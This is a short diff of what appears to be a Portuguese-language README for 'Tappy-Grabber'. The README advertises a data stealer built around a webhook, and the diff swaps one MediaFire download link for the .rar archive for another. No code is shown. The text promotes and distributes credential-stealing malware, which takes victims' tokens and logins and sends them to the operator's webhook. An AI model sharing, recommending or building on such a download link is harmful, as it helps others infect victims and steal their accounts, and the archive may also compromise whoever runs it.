@@ -9,7 +9,7 @@
 * 3- Uma webhook para criar seu stealer.
 
 <br>
-💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/gapz85o1dpcdhe8/Tappy-Grabber.rar/file
+💸 <b>• DOWNLOAD :</b> https://www.mediafire.com/file/f4xf60tgw7rvz2y/Tappy-Grabber.rar/file
 <br>
 <br>
 
